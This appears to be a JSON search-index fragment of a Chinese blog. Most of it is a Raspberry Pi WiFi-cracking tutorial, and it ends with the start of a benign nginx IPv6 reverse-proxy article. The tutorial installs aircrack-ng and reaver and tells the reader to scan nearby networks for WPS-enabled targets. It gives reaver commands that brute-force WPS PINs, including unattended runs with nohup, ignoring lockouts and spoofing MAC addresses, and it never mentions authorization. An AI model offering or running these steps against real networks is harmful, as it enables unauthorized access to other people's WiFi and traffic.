\u65e0\u7ebf\u7f51\u5361\uff08\u80fd\u7528\u5c31\u884c\uff0c\u4e0d\u8fc7\u5f3a\u5927\u7684\u65e0\u7ebf\u7f51\u5361\u4f1a\u4e8b\u534a\u529f\u500d\uff0c\u6211\u7528\u76843070\uff09 Find\u6ce8\uff1a \u65e0\u7ebf\u7f51\u5361\u4e0d\u662f\u54ea\u4e2a\u90fd\u884c\uff0c\u9700\u8981\u652f\u6301\u76d1\u542c\u6a21\u5f0f\u624d\u53ef\u4ee5\uff0c\u652f\u6301\u5217\u8868\u53ef\u4ee5\u67e5\u770b\u8fd9\u91cc\uff1a https://wikidevi.com/wiki/Wireless_adapters/Chipset_table","title":"\u786c\u4ef6\u73af\u5883"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_2","text":"sudo apt-get install -y libpcap-dev libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion ethtool sudo apt-get install -y libnl-3-200 libnl-3-dev libnl-genl-3-dev libnl-genl-3-200","title":"\u5b89\u88c5\u4f9d\u8d56\u5305"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#aircarck-ng","text":"svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng cd aircrack-ng/ make sudo make install \u8fd8\u63d0\u793a\u4e86Run 'airodump-ng-oui-update' as root (or with sudo) to install or update Airodump-ng OUI file (Internet connection required). sudo airodump-ng-oui-update","title":"\u5b89\u88c5aircarck-ng"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#reaver","text":"wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz tar zxvf reaver-1.4.tar.gz cd reaver-1.4/src ./configure make sudo make install \u4ee5\u4e0a\u4e24\u4e2a\u8d44\u6e90\u5305\u90fd\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\uff1a \u767e\u5ea6\u7f51\u76d8\u5206\u4eab \u5982\u679c\u5b89\u88c5\u6210\u529f\u540e\uff0c\u4f1a\u6709 airmon-ng , airodump-ng , reaver \u7b49\u547d\u4ee4\u53ef\u7528\u3002","title":"\u5b89\u88c5reaver"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_3","text":"sudo airmon-ng start wlan0 sudo airodump-ng mon0 \u6839\u636e\u4e0a\u9762\u7684airodump\u641c\u7d22\u5230\u7684\u65e0\u7ebf\u4fe1\u53f7\uff0c\u7136\u540e\u53ef\u4ee5\u6311\u4fe1\u53f7\u5f3a\u7684\u8fdb\u884c\u7834\u89e3\uff08\u6ce8\u610f\uff0c\u8981\u9009\u62e9\u5f00\u4e86WPS\u529f\u80fd\u7684\uff09 \u6ce8\u610f\u770b\u8fd9\u5f20\u5217\u8868\uff0c\u5217\u8868\u4e2d\u663e\u793a\u4e86\u4f60\u5468\u8fb9\u65e0\u7ebf\u7684\u76f8\u5173\u4fe1\u606f\u3002\u6ce8\u610f\u770b MB \u8fd9\u4e00\u5217\uff0c\u663e\u793a\u4e3a\" 54 \"\u3001\"54e. \"\u7b49\u7b49\uff0c\u8fd9\u8868\u793a\u4e86\u65e0\u7ebf\u5f53\u524d\u7684\u901f\u7387\u6a21\u5f0f\u4ee5\u53caWPS\u5f00\u542f\u72b6\u51b5\uff0c\u6211\u81ea\u5df1\u7684\u8def\u7531\u5668\u662f \"steve\"\uff0c\u6ce8\u610f\u770b\uff0c\u201d54e\u201c\u548c\u201d 54e. \u201c\u662f\u4e0d\u540c\u7684\uff0c\u591a\u4e86\u4e00\u4e2a \u70b9\uff0c\u8fd9\u4e2a\u70b9\u8868\u793a\u5f00\u542f\u4e86 wps\u6a21\u5f0f\u3002\u6240\u4ee5\u6211\u4eec\u4e0b\u9762\u5c31\u8fdb\u884cwps\u7684\u63a2\u6d4b\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u8981\u8bb0\u4f4fSSID\u5bf9\u5e94\u7684MAC\u5730\u5740\uff0c\u6b64\u540e\u6211\u4eec\u4f1a\u9488\u5bf9MAC\u5730\u5740\u8fdb\u884c\u653b\u51fb\u548c\u63a2\u6d4b\u3002 sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -vv \u662f\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f\u7684\uff0c\u7b49\u4f60\u719f\u7ec3\u4e86\u4e4b\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u4f7f\u7528 -v \uff0c\u8fd9\u6837\u5c31\u7b80\u5355\u4e86\u3002\u901a\u5e38\uff0c\u9047\u5230\u95ee\u9898\u624d\u4f1a\u4f7f\u7528 -vv \u3002 \u5982\u679c\u60f3\u6302\u673a\u7834\u89e3\uff0c\u8bb0\u5f97\u52a0\u4e0anohup\u547d\u4ee4\u540e\uff0c\u53ef\u4ee5\u65ad\u5f00ssh\u3002\u7136\u540e\u5269\u4e0b\u5c31\u662f\u7b49\u5f85\u3002 nohup sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -o fbi & -o \u53c2\u6570\u662f\u8f93\u51fa\u5230\u6587\u4ef6 \u5982\u679c\u7834\u89e3\u6210\u529f\u540e\uff0c\u6253\u5f00\u8f93\u51fa\u7684\u65e5\u5fd7\uff0c\u5c31\u53ef\u4ee5\u770b\u5230reaver\u51fa\u6765\u7684\u5bc6\u7801\u3002","title":"\u7834\u89e3\u6559\u7a0b"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_4","text":"","title":"\u547d\u4ee4\u8bf4\u660e\uff1a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#reaver_1","text":"","title":"reaver"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_5","text":"airmon-ng start wlan0 //\u542f\u52a8mon0\u76d1\u63a7 reaver -i mon0 -b MAC -a -S -vv //\u666e\u901a\u7528\u6cd5","title":"\u4f7f\u7528\u65b9\u6cd5\uff1a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#909pin","text":"reaver -i mon0 -b MAC -a -vv -p XXXX(PIN\u524d\u56db\u4f4d\u6570)","title":"\u5982\u679c\uff0c90.9%\u8fdb\u7a0b\u540e\u6b7b\u673a\u6216\u505c\u673a\uff0c\u8bf7\u8bb0\u4e0bPIN\u524d\u56db\u4f4d\u6570\uff0c\u7528\u6307\u4ee4\uff1a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_6","text":"airodump-ng mon0 \u7528\u6765\u626b\u63cf\u5468\u56f4\u65e0\u7ebf\u4fe1\u53f7 wash -i mon0 -C \u8fd9\u4e2a\u662f\u7528\u6765\u68c0\u6d4b\u5468\u56f4\u65e0\u7ebf\u652f\u6301PIN\u7684\u8def\u7531","title":"\u5176\u4ed6\u547d\u4ee4"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#pin-n","text":"reaver -i mon0 -b xx:xx:xx:xx:xx:xx -d 0 -vv -a -S -N \u4e5f\u53ef\u4ee5\u52a0\u5ef6\u65f6 -t 3 -b 3","title":"\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u5c1d\u8bd5\u52a0-N\u53c2\u6570"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_7","text":"-i \u76d1\u542c\u540e\u63a5\u53e3\u540d\u79f0 \u7f51\u5361\u7684\u76d1\u89c6\u63a5\u53e3\uff0c\u901a\u5e38\u662fmon0 -b \u76ee\u6807mac\u5730\u5740 AP\u7684MAC\u5730\u5740 -a \u81ea\u52a8\u68c0\u6d4b\u76ee\u6807AP\u6700\u4f73\u914d\u7f6e -S \u4f7f\u7528\u6700\u5c0f\u7684DH key\uff0c\u53ef\u4ee5\u63d0\u9ad8PJ\u901f\u5ea6 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a -d \u5373delay\u6bcf\u7a77\u4e3e\u4e00\u6b21\u7684\u95f2\u7f6e\u65f6\u95f4 \u9884\u8bbe\u4e3a1\u79d2 reaver -i mon0 -b MAC -d 0 \u7528\u4e0a\u8ff0\u6307\u4ee4\u53ef\u4ee5\u5927\u5e45\u52a0\u5febPJ\u901f\u5ea6 \u4f46\u662f\u6709\u4e9bAP\u53ef\u80fd\u53d7\u4e0d\u4e86 -c \uff08\u540e\u8ddf\u9891\u9053\u6570\uff09 \u6307\u5b9a\u9891\u9053,\u53ef\u4ee5\u65b9\u4fbf\u627e\u5230\u4fe1\u53f7 -p PIN\u7801\u56db\u4f4d\u6216\u516b\u4f4d //\u5df2\u77e5pin\u7801\u524d4\u4f4d\u53ef\u4ee5\u5e26\u6b64\u53c2\u6570\uff0c\u6307\u5b9a\u4ece\u8fd9\u4e2a\u6570\u5b57\u5f00\u59cbpin\u3002\u53ef\u4ee5\u75288\u4f4d\u76f4\u63a5\u627e\u5230\u5bc6\u7801\u3002 -N \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -n \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -t \u5373timeout\u6bcf\u6b21\u7a77\u4e3e\u7b49\u5f85\u53cd\u9988\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5982\u679c\u4fe1\u53f7\u4e0d\u9519\uff0c\u53ef\u4ee5\u8fd9\u6837###\u8bbe\u7f6e reaver -i mon0 -b MAC -d 0 -t .5 -m, --mac= \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528","title":"\u5e38\u7528\u53c2\u6570\u91ca\u7591"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#-pj","text":"\u4fe1\u53f7 \u975e\u5e38\u597d: reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1 \u4fe1\u53f7\u666e\u901a: reaver -i mon0 -b MAC -a -S -vv -d .5 -t .5 -c 1 \u4fe1\u53f7\u4e00\u822c: reaver -i mon0 -b MAC -a -S -vv -c 1 \u5f53\u51fa\u73b0\u6709\u767e\u5206\u6570\u65f6\u4f60\u5c31\u53ef\u4ee5\u7528crtl+c\u6765\u6682\u505c\uff0c\u5b83\u4f1a\u5c06reaver\u7684\u8fdb\u5ea6\u8868\u6587\u4ef6\u4fdd\u5b58\u5728 1.3\u7248\uff1a /etc/reaver/MAC\u5730\u5740.wpc 1.4\u7248\uff1a /usr/local/etc/reaver/MAC\u5730\u5740.wpc \u7528\u8d44\u6e90\u7ba1\u7406\u5668\uff0c\u624b\u5de5\u5c06\u4ee5MAC\u5730\u5740\u547d\u540d\u7684\u3001\u540e\u8f8d\u4e3awpc\u7684\u6587\u4ef6\u62f7\u8d1d\u5230U\u76d8\u6216\u786c\u76d8\u4e2d\uff0c \u4e0b\u6b21\u91cd\u542f\u52a8\u540e\uff0c\u518d\u624b\u5de5\u590d\u5236\u5230/etc/reaver/ \u76ee\u5f55\u4e0b\u5373\u53ef\u3002 \u4e0d\u662f\u6240\u6709\u7684\u8def\u7531\u90fd\u652f\u6301pin\u5b66\u4e60\u3002AP\u5173\u95ed\u4e86WPS\u3001\u6216\u8005\u6ca1\u6709QSS\u6ef4\uff0c\u4f1a\u51fa\u73b0 WARNING: Failed to associate with XX:XX:XX:XX:XX:XX (ESSID: XXXX) \u5b66\u4e60\u8fc7\u7a0b\u4e2d\u4e5f\u53ef\u968f\u65f6\u968f\u5730\u6309Ctrl+C\u7ec8\u6b62PJ\uff0c\u91cd\u590d\u540c\u4e00\u4e2aPIN\u7801 \u6216 timeou t\u53ef\u7ec8\u6b62\uff0creaver\u4f1a\u81ea\u52a8\u4fdd\u5b58\u8fdb\u5ea6\u3002 \u7ee7\u7eed\u4e0a\u6b21\u7684PJ\uff0c\u5219\u518d\u6b21\u5728\u7ec8\u7aef\u4e2d\u53d1\u9001: reaver -i mon0 -b MAC -vv \u8fd9\u6761\u6307\u4ee4\u4e0b\u8fbe\u540e\uff0c\u4f1a\u8ba9\u4f60\u9009y\u6216n\uff0c\u9009y\u540e\u5c31\u7ee7\u7eed\u4e86 \u5f53reaver\u786e\u5b9a\u524d4\u4f4dPIN\u5bc6\u7801\u540e\uff0c\u5176\u5de5\u4f5c\u5b8c\u6210\u4efb\u52a1\u8fdb\u5ea6\u6570\u503c\u5c06\u76f4\u63a5\u8df3\u8dc3\u81f390.9%\u4ee5\u4e0a\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u5269\u4f59\u4e00\u5343\u4e2a\u5bc6\u7801\u7ec4\u5408\u4e86\uff08\u603b\u5171\u4e00\u4e07\u4e00\u5343\u4e2a\u5bc6\u7801\uff09\u3002 \u53c2\u6570\u8be6\u7ec6\u8bf4\u660e: -m, --mac= MAC of the host system \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528 -e, --essid= ESSID of the target AP \u8def\u7531\u5668\u7684ESSID\uff0c\u4e00\u822c\u4e0d\u7528\u6307\u5b9a -c, --channel= Set the 802.11 channel for the interface (implies -f) \u4fe1\u53f7\u7684\u9891\u9053\uff0c\u5982\u679c\u4e0d\u6307\u5b9a\u4f1a\u81ea\u52a8\u626b\u63cf -o, --out-file= Send output to a log file [stdout] \u6807\u51c6\u8f93\u51fa\u5230\u6587\u4ef6 -s, --session= Restore a previous session file \u6062\u590d\u8fdb\u7a0b\u6587\u4ef6 -C, --exec= Execute the supplied command upon successful pin recovery pin\u6210\u529f\u540e\u6267\u884c\u547d\u4ee4 -D, --daemonize Daemonize reaver \u8bbe\u7f6ereaver\u6210Daemon -a, --auto Auto detect the best advanced options for the target AP \u5bf9\u76ee\u6807AP\u81ea\u52a8\u68c0\u6d4b\u9ad8\u7ea7\u53c2\u6570 -f, --fixed Disable channel hopping \u7981\u6b62\u9891\u9053\u8df3\u8f6c -5, --5ghz Use 5GHz 802.11 channels \u4f7f\u75285G\u9891\u9053 -v, --verbose Display non-critical warnings (-vv for more) \u663e\u793a\u4e0d\u91cd\u8981\u8b66\u544a\u4fe1\u606f -vv \u53ef\u4ee5\u663e\u793a\u66f4\u591a -q, --quiet Only display critical messages \u53ea\u663e\u793a\u5173\u952e\u4fe1\u606f -h, --help Show help \u663e\u793a\u5e2e\u52a9 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a \u9ad8\u7ea7\u53c2\u6570: -p, --pin= Use the specified 4 or 8 digit WPS pin \u76f4\u63a5\u8bfb\u53d6psk\uff08\u672c\u4eba\u6d4b\u8bd5\u672a\u6210\u529f\uff0c\u5efa\u8bae\u7528\u7f51\u5361\u81ea\u5e26\u8f6f\u4ef6\u83b7\u53d6\uff09 -d, --delay= Set the delay between pin attempts 1 pin\u95f4\u5ef6\u65f6\uff0c\u9ed8\u8ba41\u79d2\uff0c\u63a8\u8350\u8bbe0 -l, --lock-delay= Set the time to wait if the AP locks WPS pin attempts [60] AP\u9501\u5b9aWPS\u540e\u7b49\u5f85\u65f6\u95f4 -g, --max-attempts= Quit after num pin attempts \u6700\u5927pin\u6b21\u6570 -x, --fail-wait= Set the time to sleep after 10 unexpected failures [0] 10\u6b21\u610f\u5916\u5931\u8d25\u540e\u7b49\u5f85\u65f6\u95f4\uff0c\u9ed8\u8ba40\u79d2 -r, --recurring-delay= Sleep for y seconds every x pin attempts \u6bcfx\u6b21pin\u540e\u7b49\u5f85y\u79d2 -t, --timeout= Set the receive timeout period [5] \u6536\u5305\u8d85\u65f6\uff0c\u9ed8\u8ba45\u79d2 -T, --m57-timeout= Set the M5/M7 timeout period [0.20] M5/M7\u8d85\u65f6\uff0c\u9ed8\u8ba40.2\u79d2 -A, --no-associate Do not associate with the AP (association must be done by another application) \u4e0d\u8fde\u5165AP\uff08\u8fde\u5165\u8fc7\u7a0b\u5fc5\u987b\u6709\u5176\u4ed6\u7a0b\u5e8f\u5b8c\u6210\uff09 -N, --no-nacks Do not send NACK messages when out of order packets are received \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -S, --dh-small Use small DH keys to improve crack speed \u4f7f\u7528\u5c0fDH\u5173\u952e\u503c\u63d0\u9ad8\u901f\u5ea6\uff08\u63a8\u8350\u4f7f\u7528\uff09 -L, --ignore-locks Ignore locked state reported by the target AP \u5ffd\u7565\u76ee\u6807AP\u62a5\u544a\u7684\u9501\u5b9a\u72b6\u6001 -E, --eap-terminate Terminate each WPS session with an EAP FAIL packet \u6bcf\u5f53\u6536\u5230EAP\u5931\u8d25\u5305\u5c31\u7ec8\u6b62WPS\u8fdb\u7a0b -n, --nack Target AP always sends a NACK [Auto] \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -w, --win7 Mimic a Windows 7 registrar [False] \u6a21\u62dfwin7\u6ce8\u518c\uff0c\u9ed8\u8ba4\u5173\u95ed","title":"\u5c0f\u7ed3-PJ\u65f6\u5e94\u56e0\u72b6\u51b5\u8c03\u6574\u53c2\u6570:"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#reference","text":"http://lok.me/a/1972.html http://bao3.blogspot.com/2013/05/raspberry-pi.html http://tieba.baidu.com/p/2682878857 http://www.nyaboron.moe/posts/606.html \u6587\u7ae0\u7248\u6743\u5f52 FindHao \u6240\u6709\u4e28\u672c\u7ad9\u9ed8\u8ba4\u91c7\u7528CC-BY-NC-SA 4.0\u534f\u8bae\u8fdb\u884c\u6388\u6743| \u8f6c\u8f7d\u5fc5\u987b\u5305\u542b\u672c\u58f0\u660e\uff0c\u5e76\u4ee5\u8d85\u94fe\u63a5\u5f62\u5f0f\u6ce8\u660e\u4f5c\u8005 FindHao \u548c\u672c\u6587\u539f\u59cb\u5730\u5740\uff1a https://www.findhao.net/easycoding/1184.html","title":"Reference"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/","text":"\u6811\u8393\u6d3e\u5229\u7528nginx\u53cd\u5411\u4ee3\u7406\uff0c\u6210\u4e3aIPv6/IPv4\u516c\u7f51\u670d\u52a1\u5668\uff08\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668\uff09 \u6548\u679c \u6811\u8393\u6d3e\u53ea\u9700\u8fde\u63a5\u7535\u6e90\uff0c\u4ee5\u53ca\u6709\u514d\u8d39IPv6\u670d\u52a1\u7684\u7f51\u7ebf\uff0c\u5373\u53ef\u6210\u4e3a\u516c\u7f51\u4e0a\u7684IPv6\u670d\u52a1\u5668\uff1b\u5982\u679c\u6709\u540c\u65f6\u652f\u6301IPv4\u548cIPv6\u7684\u53cc\u6808\u670d\u52a1\u5668\uff0c\u6811\u8393\u6d3e\u8fd8\u80fd\u6210\u4e3a\u516c\u7f51\u4e0a\u7684IPv4\u670d\u52a1\u5668\u3002 \u52a8\u673a \u4e4b\u524d\u53d1\u73b0\u5b66\u6821\u63d0\u4f9b\u514d\u8d39\u4e0d\u95f4\u65ad\u7684IPv6\u670d\u52a1\uff0c\u800c\u4e14DigitalOcean\u7684VPS\u4e5f\u80fd\u63d0\u4f9bIPv6\u7f51\u7edc\uff0c\u6240\u4ee5\u840c\u751f\u4e86\u81ea\u5df1\u5efa\u7acb\u670d\u52a1\u5668\u7684\u60f3\u6cd5\u3002 \u9274\u4e8e\u9700\u8981\u4e00\u53f0\u8017\u7535\u91cf\u5c0f\u3001\u566a\u58f0\u5c0f\u4e14\u80fd\u591f\u957f\u671f\u4e0d\u5173\u673a\u8fd0\u884c\u7684\u670d\u52a1\u5668\uff0c\u81ea\u7136\u800c\u7136\u60f3\u5230\u4e86\u6811\u8393\u6d3e\u3002\u4e8e\u662f\u7ecf\u8fc7\u51e0\u5929\u7684\u6298\u817e\uff0c\u7ec8\u4e8e\u5b9e\u73b0\u4e86\u628a\u6811\u8393\u6d3e\u4f5c\u4e3a\u516c\u7f51\u670d\u52a1\u5668\u7684\u60f3\u6cd5\uff0c\u4f46\u79bb\u7406\u60f3\u60c5\u51b5\u8fd8\u662f\u6709\u4e9b\u5dee\u8ddd\uff0c\u4e3b\u8981\u7279\u70b9\uff1a \u672c\u5730\u800c\u8a00\u53ea\u9700\u8981\u7528\u5230IPv6\u7f51\u7edc\uff0c\u5bf9IPv4\u7f51\u7edc\u6ca1\u6709\u8981\u6c42 \u4f5c\u4e3aIPv6\u670d\u52a1\u5668\uff0c\u91c7\u7528DDNS\u65b9\u6cd5\uff0c\u4f46\u5411DNSPod\u66f4\u65b0DNS\u4fe1\u606f\u9700\u8981\u6709\u672c\u5730\u6216\u8fdc\u7a0bIPv4\u7f51\u7edc\u7684\u652f\u6301 \u4f5c\u4e3aIPv4\u670d\u52a1\u5668\uff0c\u91c7\u7528nginx\u53cd\u5411\u4ee3\u7406\uff0c\u4e00\u5b9a\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668\uff08\u7406\u8bba\u4e0a\u672c\u5730\u53cc\u6808\u7535\u8111\u4e5f\u53ef\u4ee5\uff09 \u5927\u4f53\u601d\u8def \u8fd9\u91cc\u5047\u8bbe\u7684\u90fd\u662f\u91c7\u7528\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u5373DigitalOcean\u5728\u65e7\u91d1\u5c71\u7684\u540c\u65f6\u652f\u6301IPv4\u548cIPv6\u7684VPS\u3002 \u4f5c\u4e3aIPv6\u670d\u52a1\u5668 \u6b64\u65f6\u91c7\u7528DDNS\u65b9\u6cd5\uff0c\u56e0\u4e3a\u81ea\u5df1\u6709\u57df\u540d\uff0c\u800cDNSPod\u652f\u6301IPv6\u7684AAAA\u8bb0\u5f55\uff0c\u4e14DNSPod\u63d0\u4f9bAPI\uff0c\u6240\u4ee5\u91c7\u7528\u6bcf\u6b21IPv6\u5730\u5740\u53d8\u5316\u5219\u5411DNSPod\u53d1\u9001\u4fee\u6539\u8bb0\u5f55\u8bf7\u6c42\uff0c\u8fd9\u6837\u5b9e\u73b0DDNS\u3002 \u5176\u4e2d\u5b58\u5728\u7684\u95ee\u9898\u662fDNSPod\u5e76\u4e0d\u652f\u6301\u7eafIPv6\u73af\u5883\u4e0b\u7684API\u8bf7\u6c42\uff0c\u5373\u53d1\u9001\u8bf7\u6c42\u5fc5\u987b\u7528\u5230IPv4\u7f51\u7edc\uff08\u901a\u8fc7IPv4\u7f51\u7edc\u53d1\u9001IPV6\u8bb0\u5f55\u7684\u4fee\u6539\u8bf7\u6c42\uff09\u3002\u6240\u4ee5\u91c7\u7528\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u672c\u5730\u901a\u8fc7IPv6\u4f5c\u4e3ahttp\u7684client\u8bbf\u95ee\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u4f5c\u4e3ahttp server\u63a5\u6536\u8bf7\u6c42\uff0c\u5e76\u8bb0\u5f55\u8bf7\u6c42\u7684IPv6\u5730\u5740\uff08\u5373\u672c\u5730\u670d\u52a1\u5668IPv6\u5730\u5740\uff09\uff0c\u7136\u540e\u8fdc\u7a0b\u670d\u52a1\u5668\u901a\u8fc7IPv4\u8c03\u7528DNSPod API\uff0c\u4fee\u6539\u5bf9\u5e94\u8bb0\u5f55\uff0c\u5b9e\u73b0DDNS\u3002 \u4f5c\u4e3aIPv4\u670d\u52a1\u5668 \u6b64\u65f6\u91c7\u7528\u53cd\u5411\u4ee3\u7406\u65b9\u6cd5\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668nginx\u8bbe\u7f6e\u53cd\u5411\u4ee3\u7406\uff0c\u5730\u5740\u4e3a\u672c\u5730\u670d\u52a1\u5668IPv6\u5730\u5740\u3002\u8fd9\u6837\u53ef\u4ee5\u5229\u7528DDNS\u65f6\u8fdc\u7a0b\u670d\u52a1\u5668\u5f97\u5230\u7684IPv6\u5730\u5740\uff0c\u6765\u66f4\u65b0nginx\u4e2d\u53cd\u5411\u4ee3\u7406\u7684\u8bbe\u7f6e\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5f53\u67d0\u4e2aIPv4\u7528\u6237\u60f3\u8981\u8bbf\u95ee\u672c\u5730\u670d\u52a1\u5668\u65f6\uff0c\u5176\u901a\u8fc7\u57df\u540d\u8bbf\u95ee\u9996\u5148\u4f1a\u901a\u8fc7IPv4\u8bbf\u95ee\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u53cd\u5411\u4ee3\u7406\u5c06\u8bf7\u6c42\u901a\u8fc7IPv6\u53d1\u9001\u5230\u672c\u5730\u670d\u52a1\u5668\uff0c\u672c\u5730\u670d\u52a1\u5668\u4f5c\u51fa\u54cd\u5e94\u540e\uff0c\u5c06\u7ed3\u679c\u901a\u8fc7IPv6\u8fd4\u56de\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u6700\u540e\u901a\u8fc7IPv4\u8fd4\u56de\u5230\u7528\u6237\u3002 \u53ef\u4ee5\u8bf4\u4e00\u6b21\u8bf7\u6c42\u9700\u8981\u8de8\u8d8a4\u6b21\u592a\u5e73\u6d0b\uff0c\u4f46\u6839\u636e\u5b9e\u9645\u6d4b\u8bd5\uff0c\u54cd\u5e94\u65f6\u95f4\u8fd8\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\u3002 \u5177\u4f53\u5b9e\u73b0 \u5173\u4e8e\u6811\u8393\u6d3e \u6811\u8393\u6d3e\u5e76\u6ca1\u6709\u4f7f\u7528\u5b98\u65b9\u56fa\u4ef6\uff0c\u800c\u662f\u6700\u521d\u91c7\u7528\u4e86Ubuntu 14.04 LTS\uff0c\u5176\u540e\u8f6c\u79fb\u5230Ubuntu 15.04\u3002\u56e0\u4e3a\u662f\u4f5c\u4e3aserver\u7528\uff0c\u6240\u4ee5\u66f4\u503e\u5411\u4e8e\u91c7\u7528Ubuntu\u7684server\u7248\u672c\u3002 \u5173\u4e8e\u6811\u8393\u6d3e\u5982\u4f55\u8fde\u4e0aIPv6\u7f51\u7edc\uff0c\u5b9e\u9645\u5c31\u662fUbuntu\u5982\u4f55\u8fde\u4e0aIPv6\u7f51\u7edc\u4e86\uff0c\u8fd9\u6837\u7684\u4f8b\u5b50\u5f88\u591a\uff0c\u5bf9\u4e8e\u67d0\u4e9b\u7279\u6b8a\u60c5\u51b5\uff0c\u6211\u4e4b\u524d\u4e5f\u6709\u5199\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6cd5\u3002 \u8fdc\u7a0b\u670d\u52a1\u5668\u7aef \u56e0\u4e3a\u672c\u5730IPv6\u5730\u5740\u662fDHCP\u5206\u914d\uff0c\u4e00\u76f4\u5728\u53d8\u52a8\uff0c\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u9891\u7e41\u5411\u8fdc\u7a0b\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u3002\u56e0\u4e3a\u6211\u7684\u8fdc\u7a0b\u670d\u52a1\u5668\u8fd0\u884c\u6709Flask\u5e94\u7528\uff0c\u800c\u6211\u5bf9Python\u6bd4\u8f83\u719f\u6089\uff0c\u52a0\u4e0a\u5bf9\u4e8e\u65b9\u6848\u5b9e\u73b0\u6211\u6bd4\u8f83\u503e\u5411\u4e8e\u7528http\u5b9e\u73b0\uff0c \u6240\u4ee5\u8003\u8651\u518d\u4e09\u51b3\u5b9a\u91c7\u7528nginx+uwsgi+flask+python \u3002 